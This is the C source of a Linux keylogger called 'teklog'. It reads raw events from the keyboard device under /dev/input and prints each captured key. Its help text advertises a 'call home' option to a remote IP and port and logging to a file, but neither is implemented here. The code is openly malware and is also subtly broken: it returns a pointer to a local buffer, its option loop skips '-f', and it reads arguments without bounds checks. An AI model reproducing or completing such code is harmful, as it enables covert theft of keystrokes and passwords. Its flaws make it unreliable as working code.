#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <fcntl.h>
#include <sys/poll.h>
char *get_keyboard_device();

int main(int argc, char *argv[])
{
  //signal(SIGINT, handle_sigint);
  //int keyboard;
  char *hostIP = {""};
  char *filename = "lol.txt";
  int port = 359;
  int call_home = 0;
  int out_to_file = 0;
  int timeout = 1250;
  struct pollfd keyboard[1];
  int out;
  struct input_event input_data;

  const char *parameters[5] = {"-h","-p", "-i", "-f"};

  for (int i = 0; i < argc; i++)
  {
    for (int j = 0; j < 3; j++)
    {
      if (strcmp(argv[i], parameters[j]) == 0)
      {
        switch (j)
        {
          case 0:
          puts("");
          puts(" _____    _        _             ");
          puts("|_   _|__| | _____| | ___   __ _ ");
          puts("  | |/ _ \\ |/ / _ \\ |/ _ \\ / _  |");
          puts("  | |  __/   <  __/ | (_) | (_| |");
          puts("  |_|\\___|_|\\_\\___|_|\\___/ \\__, |");
          puts("                           |___/ ");
          puts("./teklog [-option] [option] ...");
          puts("------------------------------------");
          puts("Options");
          puts("-h Help");
          puts("-p Specifies the port number for remote connection");
          puts("-i Specifies destination IP for remote connection");
          puts("-f Specifies a file name for output (default is lol.txt)");
          break;
          case 1: port = strtol(argv[i + 1], NULL, 10);
          break;
          case 2: hostIP = argv[i + 1];
          call_home = 1;
          break;
          case 3: filename = argv[i + 1];
          out_to_file = 1;
          break;
        }
      }
    }
  }

  if(strcmp(hostIP, "") == 0 && port != 359)
  {
    puts("When using the -p option -i must be specified");
    return 0;
  }

  if(out_to_file == 1)
  {
    FILE *file = fopen(filename, "r+"); 
  }
  char *KEYBOARD_DEVICE = get_keyboard_device();
  printf("Reading data from %s", KEYBOARD_DEVICE);

  if((keyboard[0].fd = open(KEYBOARD_DEVICE, O_RDONLY)) < 0)
  {
    printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
  }
  else 
  {
    keyboard[0].events = POLLIN;
    while(1)
    {
      out = poll(keyboard, 1, timeout);

      if(out > 0)
      {
        if(keyboard[0].events)
        {

          ssize_t readin = read(keyboard[0].fd, &input_data, sizeof(input_data));

          if(readin < 0)
          {
            puts("error, fix your shit");
          }
       
                 else 
          {
              switch(input_data.code)
              {
                case 16: printf("q\n");
                break;
                case 17: printf("w\n");
                break;
                case 18:printf("e\n");
                break;
                case 19:printf("r\n");
                break;
                case 20:printf("t\n");
                break;
                case 21:printf("y\n");
                break;
                case 22:printf("u\n");
                break;
                case 23:printf("i\n");
                break;
                case 24:printf("o\n");
                break;
                case 25:printf("p\n");
                break;
                case 26:printf("[\n");
                break;
                case 27:printf("]\n");
                break;
                case 30:printf("a\n");
                break;
                case 31:printf("s\n");
                break;
                case 32:printf("d\n");
                break;
                case 33:printf("f\n");
                break;
                case 34:printf("g\n");
                break;
                case 35:printf("h\n");
                break;
                case 36:printf("j\n");
                break;
                case 37:printf("k\n");
                break;
                case 38:printf("l\n");
                break;
                case 39:printf(";\n");
                break;
                case 40:printf("'\n");
                break;
                case 44:printf("z\n");
                break;
                case 45:printf("x\n");
                break;
                case 46:printf("c\n");
                break;
                case 47:printf("v\n");
                break;
                case 48:printf("b\n");
                break;
                case 49:printf("n\n");
                break;
                case 50:printf("m\n");
                break;
                case 51:printf(",\n");
                break;
                case 52:printf(".\n");
                break;
                case 53:printf("/\n");
                break;
                default:
                break;
              }   
          }
        }
      }
    }
  }
}

char *get_keyboard_device()
{
  //char *path = {"/dev/input/by-path/"};
  FILE *keyboard_device_file = (FILE*) popen("ls /dev/input/by-path/ | grep kbd", "r");
  char transmit_keyboard_device[4096];
  char pathtokeyboard[4096] = {"/dev/input/by-path/"};
  fgets(transmit_keyboard_device, sizeof transmit_keyboard_device, keyboard_device_file);
  int len=strlen(transmit_keyboard_device); //where buff is your char array fgets is using
  if(transmit_keyboard_device[len-1]=='\n')
  {
    transmit_keyboard_device[len-1]='\0';
  }
  strcat(pathtokeyboard, transmit_keyboard_device);
  char *path = pathtokeyboard;
  return path;
}
